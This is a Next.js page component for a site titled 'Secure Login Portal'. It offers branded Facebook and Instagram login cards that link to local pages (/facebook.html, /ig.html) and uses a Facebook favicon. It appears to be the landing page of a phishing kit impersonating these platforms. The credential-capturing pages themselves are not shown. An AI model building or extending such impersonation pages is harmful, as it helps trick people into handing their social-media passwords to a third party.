import { useState, useEffect } from 'react';
import Head from 'next/head';
import Link from 'next/link';
import { useRouter } from 'next/router';
import styles from '../styles/Home.module.css';
import fs from 'fs';
import path from 'path';

// This gets called at build time
export async function getStaticProps() {
  const filePath = path.join(process.cwd(), 'public', 'index.html');
  const htmlContent = fs.readFileSync(filePath, 'utf8');
  
  return {
    props: {
      htmlContent
    }
  };
}

export default function Home() {
  const router = useRouter();
  const [loading, setLoading] = useState(false);
  
  useEffect(() => {
    const handleRouteChange = () => {
      setLoading(true);
    };

    router.events.on('routeChangeStart', handleRouteChange);
    return () => {
      router.events.off('routeChangeStart', handleRouteChange);
    };
  }, [router]);

  return (
    <div className={styles.container}>
      <Head>
        <title>Secure Login Portal</title>
        <meta name="description" content="Secure login portal for multiple platforms" />
        <link rel="icon" href="/assets/facebook.svg" />
      </Head>

      <main className={styles.main}>
        <h1 className={styles.title}>
          Secure Login Portal
        </h1>

        <p className={styles.description}>
          Choose your platform to continue
        </p>

        <div className={styles.grid}>
          <Link href="/facebook.html" className={styles.card}>
            <div>
              <h2>Facebook Login &rarr;</h2>
              <p>Access your Facebook account securely.</p>
              <div className={styles.iconContainer}>
                <img src="/assets/facebook.svg" alt="Facebook Icon" className={styles.icon} />
              </div>
            </div>
          </Link>

          <Link href="/ig.html" className={styles.card}>
            <div>
              <h2>Instagram Login &rarr;</h2>
              <p>Access your Instagram account securely.</p>
              <div className={styles.iconContainer}>
                <img src="/assets/instagram-icon.svg" alt="Instagram Icon" className={styles.icon} />
              </div>
            </div>
          </Link>
        </div>
      </main>

      <footer className={styles.footer}>
        <p>© 2023 Secure Login Portal - All rights reserved</p>
      </footer>
    </div>
  );
} 